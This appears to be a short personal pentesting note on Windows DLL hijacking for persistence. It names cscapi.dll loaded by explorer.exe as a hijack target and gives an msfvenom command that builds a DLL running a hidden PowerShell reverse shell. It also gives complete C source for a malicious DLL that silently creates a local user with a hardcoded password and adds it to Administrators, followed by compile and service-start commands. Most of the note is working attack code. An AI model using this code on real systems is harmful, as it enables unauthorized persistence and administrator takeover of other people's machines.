**DLL hijacking** is a technique where a program loads a malicious DLL from a writable location due to how it searches for DLLs in directories listed in the `%PATH%` environment variable.

A notable dll for persistence is **`cscapi.dll`**, which can be hijacked because it's loaded by **`explorer.exe`** during user logon. Dropping a rogue `cscapi.dll` in a location like `C:\Windows`  if included in the search path and writable—can allow for **silent code execution and persistence**.
![[Pasted image 20250707233638.png]]

with msfvenom to get revshell
```bash
msfvenom -p windows/x64/exec CMD='powershell.exe -nop -w hidden -e <powershell b64 revshell payload>' EXITFUNC=none -f dll > x.dll
```

---
## DLL for adding users to local admin:

```C
#include <windows.h>
#include <lm.h>
#pragma comment(lib, "netapi32.lib")

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        USER_INFO_1 ui;
        DWORD dwError;

        ui.usri1_name = L"pix3l";
        ui.usri1_password = L"P@ssw0rd";
        ui.usri1_priv = USER_PRIV_USER;
        ui.usri1_home_dir = NULL;
        ui.usri1_comment = NULL;
        ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
        ui.usri1_script_path = NULL;

        NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);

        LOCALGROUP_MEMBERS_INFO_3 account;
        account.lgrmi3_domainandname = L"pix3l";
        NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
    }
    return TRUE;
}

```

compiling:
```bash
x86_64-w64-mingw32-gcc adduser.c -o pix3l.dll -lnetapi32 -shared

```


> You have to start the service after you hijacked the DLL, `net start <SERVICE_NAME>`

